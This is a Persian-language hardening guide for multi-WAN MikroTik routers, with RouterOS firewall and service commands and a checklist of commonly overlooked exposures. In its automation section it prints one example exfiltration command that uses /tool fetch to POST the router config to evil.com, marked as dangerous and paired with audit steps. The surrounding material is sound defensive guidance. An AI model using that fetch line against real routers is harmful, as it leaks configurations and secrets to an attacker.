# امنیت نادیده‌گرفته‌شده — تهدیدهای به‌ندرت پوشش‌داده‌شده

> شکاف‌های امنیتی که راهنماهای سخت‌سازی استاندارد در استقرارهای Multi-WAN MikroTik از قلم می‌اندازند.

---

## دسته ۱ — Management Plane

### 1.1 Winbox روی WAN (هنوز شماره ۱ در ۲۰۲۵)

بیشتر روترهای MikroTik Compromise‌شده Winbox از اینترنت در دسترس دارند. حتی روترهای Patch‌شده Brute Force می‌شوند.

```
# Verify Winbox is NOT reachable from WAN
/ip firewall filter
add chain=input in-interface-list=WAN protocol=tcp dst-port=8291 action=drop \
    comment="BLOCK Winbox WAN" place-before=0

/ip service print
# winbox address must NOT be 0.0.0.0/0
```

### 1.2 MAC-Winbox (کشف Layer 2)

Winbox روترها را از طریق **MNDP** (Port 5678 UDP) و **MAC-Telnet** (Port 20561) کشف می‌کند. مهاجمان در همان Segment L2 می‌توانند روترها را حتی بدون IP کشف و دسترسی پیدا کنند.

```
/tool mac-server
set allowed-interface-list=none

/tool mac-server mac-winbox
set allowed-interface-list=none

/tool bandwidth-server
set enabled=no
```

### 1.3 RoMON (Router Management Overlay Network)

RoMON یک Mesh مدیریت پنهان ایجاد می‌کند. به‌ندرت غیرفعال می‌شود و اغلب برای Lateral Movement سوءاستفاده می‌شود.

```
/tool romon
set enabled=no
```

### 1.4 افشای REST API (RouterOS 7)

```
/ip service print
# api-ssl should be disabled or restricted
/ip service set api-ssl disabled=yes
# If needed:
/ip service set api-ssl address=192.168.1.0/24 certificate=your-cert
```

### 1.5 SNMP Community پیش‌فرض

```
/snmp community print
# NEVER leave "public" or "private"
/snmp community set [find name=public] disabled=yes
/snmp community add name=monitoring addresses=192.168.1.0/24 security=authorized
```

---

## دسته ۲ — مخصوص Multi-WAN

### 2.1 DNS Resolver باز روی تمام IPهای WAN

هر IP عمومی WAN می‌تواند Query DNS دریافت کند اگر `allow-remote-requests=yes` بدون فیلتر باشد.

```
/ip dns set allow-remote-requests=yes
/ip firewall filter
add chain=input in-interface-list=WAN protocol=udp dst-port=53 action=drop \
    comment="No DNS from WAN"
add chain=input in-interface-list=WAN protocol=tcp dst-port=53 action=drop
```

### 2.2 NTP Amplification از طریق تمام WANها

```
/ip firewall filter
add chain=input in-interface-list=WAN protocol=udp dst-port=123 action=drop
/system ntp client set enabled=yes
# NTP client only — not server
```

### 2.3 Port Bandwidth Test (TCP 2000)

Bandwidth-test MikroTik بردار رایج DDoS Amplification است.

```
/ip firewall filter
add chain=input in-interface-list=WAN protocol=tcp dst-port=2000 action=drop
/tool bandwidth-server set enabled=no
```

### 2.4 Session BGP بدون احراز هویت

```
/routing bgp connection
# Always set password:
set isp1 password=strong-bgp-md5-password
```

### 2.5 افشای اطلاعات Mangle PCC

Connection Markها نشان می‌دهند کاربر از کدام WAN استفاده می‌کند. یک Insider می‌تواند مسیر ISP را از نام Mark استنباط کند. در محیط‌های با امنیت بالا از Markهای غیرتوصیفی استفاده کنید:

```
# Instead of "WAN1-conn" use:
new-connection-mark=0x1A
```

### 2.6 Firewall نامتقارن — IPv6 فراموش‌شده

بیشتر سخت‌سازی‌های Multi-WAN فقط IPv4 را پوشش می‌دهند. IPv6 تمام قوانین را Bypass می‌کند اگر `/ipv6 firewall` خالی باشد.

```
/ipv6 firewall filter
add chain=input connection-state=established,related action=accept
add chain=input in-interface-list=WAN action=drop
add chain=forward in-interface-list=WAN connection-state=new action=drop
```

---

## دسته ۳ — سطح حمله Automation

### 3.1 تزریق Script در Netwatch

اگر Netwatch میزبانی را که توسط مهاجم کنترل می‌شود مانیتور کند، `down-script` و `up-script` با امتیازات روتر اجرا می‌شوند.

**قانون:** هرگز میزبان‌های خارجی غیرقابل‌اعتماد را در Scriptهای Netwatch مانیتور نکنید. فقط از IPهای Gateway استفاده کنید.

### 3.2 Scriptهای Scheduler با متغیرهای Global

```
/system script print
# Review ALL scripts for:
# - fetch commands to external URLs
# - user creation
# - firewall rule modification
# - unauthorized /tool e-mail send
```

### 3.3 Data Exfiltration با دستور Fetch

```
# DANGEROUS — exfiltrates config to external server:
/tool fetch url="http://evil.com/collect" http-method=post http-data=$config

# Audit:
/system script print
/tool fetch print
```

### 3.4 اجرای Script DHCP Client

Scriptهای DHCP Client در هر تمدید Lease اجرا می‌شوند. سرور DHCP Compromise‌شده می‌تواند دستور تزریق کند.

```
/ip dhcp-client print
# Review all scripts= parameters
```

---

## دسته ۴ — حفاظت از داده

### 4.1 Export Config شامل Secretهای Plaintext

```
/export file=test
# File contains: password=, secret=, pre-shared-key= in plaintext
```

**سیاست:**
- فایل‌های `.rsc` را قبل از ذخیره Offsite رمزگذاری کنید
- از Password Vault برای اعتبارنامه‌ها استفاده کنید، نه فایل‌های Config
- برای Backup ترجیحاً `/system backup save` (باینری) به‌جای `/export`

### 4.2 پایگاه داده کاربر Hotspot

```
/ip hotspot user print
# Passwords stored in plaintext
/ip hotspot user export file=hotspot-users
# This file is a security risk
```

### 4.3 PSK IPsec در Config

```
/ip ipsec identity print
# secret= visible in export
# Use certificate-based authentication for production VPN
```

### 4.4 Cloud Backup (MikroTik cloud.sync)

در صورت فعال بودن، Config به Cloud MikroTik همگام می‌شود. بررسی کنید آیا این با الزامات Data Sovereignty شما سازگار است.

```
/system backup cloud print
```

---

## دسته ۵ — لایه شبکه

### 5.1 IP Spoofing از LAN

بدون فیلتر سخت‌گیرانه، کلاینت‌های LAN می‌توانند IP مبدأ را جعل کنند تا طبقه‌بندی PCC را دستکاری کنند.

```
/ip firewall filter
add chain=forward in-interface-list=LAN src-address=!192.168.1.0/24 action=drop \
    comment="Anti-spoof LAN"
```

### 5.2 Neighbor Discovery (MNDP/CDP)

روتر هویت خود را روی تمام Interfaceها از جمله WAN Broadcast می‌کند.

```
/ip neighbor discovery-settings
set discover-interface-list=LAN
set protocol=none
# Or restrict to LAN only
```

### 5.3 UPnP (در صورت فعال بودن)

```
/ip upnp
print
# Should be disabled on edge routers
set enabled=no
```

### 5.4 Proxy ARP روی WAN

می‌تواند ARP Spoofing و Man-in-the-Middle روی Segmentهای WAN مشترک ایجاد کند.

```
/interface print
# verify proxy-arp=disabled on WAN interfaces
/interface set ether1 arp=enabled
# NOT proxy-arp
```

### 5.5 حملات ICMP Redirect

```
/ip settings
set accept-redirects=no
set accept-source-route=no
set allow-fast-path=no
```

---

## دسته ۶ — فیزیکی و Supply Chain

### 6.1 دسترسی به Port Console

Console سریال دسترسی کامل بدون احراز هویت شبکه فراهم می‌کند. امنیت فیزیکی Rack الزامی است.

### 6.2 رمز Bootloader RouterBOARD

```
/system routerboard settings
set boot-device=try-ethernet-once-then-nand
# Prevent netboot from untrusted source
```

### 6.3 افشای Netinstall

روتر در حالت netboot هر Image RouterOS را از شبکه می‌پذیرد. PXE/Netinstall را به VLAN مدیریت محدود کنید.

### 6.4 سخت‌افزار تقلبی

فقط از توزیع‌کنندگان مجاز MikroTik خرید کنید. واحدهای CCR تقلبی با Bootloaderهای تغییریافته یافت شده‌اند.

---

## دسته ۷ — Compliance و ممیزی

### 7.1 شکاف‌های Logging

بیشتر استقرارها Dropهای Firewall از WAN را Log نمی‌کنند. در طول ممیزی‌ها به‌طور موقت فعال کنید:

```
/ip firewall filter
add chain=input in-interface-list=WAN action=log log-prefix="AUDIT-WAN-IN" \
    comment="Temporary audit rule — disable after review"
```

### 7.2 نبود Change Management

هر `/import` یا تغییر دستی باید با نام مهندس، تاریخ و دلیل ثبت شود.

### 7.3 چرخش رمز

RouterOS انقضای رمز ندارد. سیاست چرخش فصلی را به‌صورت دستی پیاده‌سازی کنید.

### 7.4 احراز هویت دو مرحله‌ای

RouterOS 7 از احراز هویت SSH Key پشتیبانی می‌کند. به‌جای رمز برای SSH از Key استفاده کنید:

```
/user ssh-keys import public-key-file=id_rsa.pub user=admin
/ip service set ssh auth-methods=publickey
```

---

## چک‌لیست امنیت نادیده‌گرفته‌شده

| # | مورد | اغلب از قلم می‌افتد | ☐ |
|---|------|---------------------|---|
| 1 | Winbox از WAN مسدود شده | بله | ☐ |
| 2 | MAC-Winbox غیرفعال شده | بله | ☐ |
| 3 | RoMON غیرفعال شده | بله | ☐ |
| 4 | Bandwidth-server غیرفعال شده | بله | ☐ |
| 5 | Firewall IPv6 پیکربندی شده | بله | ☐ |
| 6 | DNS از WAN مسدود شده | بله | ☐ |
| 7 | NTP از WAN مسدود شده | بله | ☐ |
| 8 | SNMP Community تغییر کرده | بله | ☐ |
| 9 | رمز BGP تنظیم شده | بله | ☐ |
| 10 | Scriptهای Netwatch ممیزی شده | بله | ☐ |
| 11 | Scriptهای Scheduler ممیزی شده | بله | ☐ |
| 12 | Exportهای Config رمزگذاری شده | بله | ☐ |
| 13 | MNDP به LAN محدود شده | بله | ☐ |
| 14 | Proxy ARP روی WAN غیرفعال | بله | ☐ |
| 15 | ICMP Redirect غیرفعال | بله | ☐ |
| 16 | قوانین Anti-spoof LAN | بله | ☐ |
| 17 | SSH Key Auth فعال | بله | ☐ |
| 18 | RouterOS روی آخرین Stable | بله | ☐ |
| 19 | بدون کاربر پیش‌فرض/ضعیف | بله | ☐ |
| 20 | Console فیزیکی امن شده | بله | ☐ |

---

**[← مرجع CVE](cve-exploit-reference.md)** | **[تمرین‌های آزمایشگاهی →](lab-exercises.md)**
